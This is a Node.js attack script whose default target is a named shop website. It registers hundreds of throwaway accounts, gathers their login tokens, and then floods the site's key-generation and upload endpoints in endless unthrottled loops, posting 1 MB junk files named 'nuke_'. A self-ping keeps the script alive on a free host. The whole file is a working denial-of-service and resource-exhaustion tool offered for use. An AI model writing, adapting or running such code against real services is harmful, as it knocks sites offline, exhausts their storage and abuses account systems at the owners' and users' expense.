const http = require('http');
const https = require('https');
const { URL } = require('url');
const targetUrl = process.env.TARGET_URL || 'https://shopaccnqp.onrender.com';
const port = process.env.PORT || 10000;
const accCount = parseInt(process.env.ACC_COUNT || '500');
const bigContent = 'A'.repeat(1048576);
let reqCount = 0;
const tokens = [];

const parsedTarget = new URL(targetUrl);
const isHttps = parsedTarget.protocol === 'https:';
const transport = isHttps ? https : http;

const makeRequest = (method, path, headers, body) => {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: parsedTarget.hostname,
      port: parsedTarget.port || (isHttps ? 443 : 80),
      path: path,
      method: method,
      headers: headers,
    };
    const req = transport.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, body: JSON.parse(data) });
        } catch (e) {
          resolve({ status: res.statusCode, body: data });
        }
      });
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
};

const quickFire = (method, path, headers, body) => {
  const options = {
    hostname: parsedTarget.hostname,
    port: parsedTarget.port || (isHttps ? 443 : 80),
    path: path,
    method: method,
    headers: headers,
  };
  const req = transport.request(options);
  req.on('error', () => {});
  if (body) req.write(body);
  req.end();
};

const randStr = (len) => {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < len; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
};

const randPass = () => randStr(8) + '@' + randStr(4);

const spamKey = (token) => {
  const send = () => {
    const headers = {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + token,
    };
    quickFire('POST', '/api/keys/generate', headers, JSON.stringify({ durationMs: 604800000 }));
    reqCount++;
    setImmediate(send);
  };
  send();
};

const spamCode = (token) => {
  const send = () => {
    const headers = {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + token,
    };
    quickFire('POST', '/api/uploads/code', headers, JSON.stringify({
      content: bigContent,
      filename: 'nuke_' + Date.now() + '_' + randStr(6) + '.txt',
      note: ''
    }));
    reqCount++;
    setImmediate(send);
  };
  send();
};

const registerAndGetToken = async (i) => {
  const username = 'x' + randStr(8) + '_' + i;
  const password = randPass();
  const headers = { 'Content-Type': 'application/json' };
  try {
    await makeRequest('POST', '/api/auth/register', headers, JSON.stringify({ username, password }));
    const loginRes = await makeRequest('POST', '/api/auth/login', headers, JSON.stringify({ username, password }));
    if (loginRes.body && loginRes.body.token) tokens.push(loginRes.body.token);
  } catch (e) {}
};

const startSpam = async () => {
  for (let i = 0; i < accCount; i++) {
    await registerAndGetToken(i);
  }
  for (const token of tokens) {
    spamKey(token);
    spamCode(token);
  }
};

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Requests sent: ' + reqCount);
});

server.listen(port, () => {
  startSpam();
  setInterval(() => {
    http.get(`http://localhost:${port}`, () => {}).on('error', () => {});
  }, 600000);
});
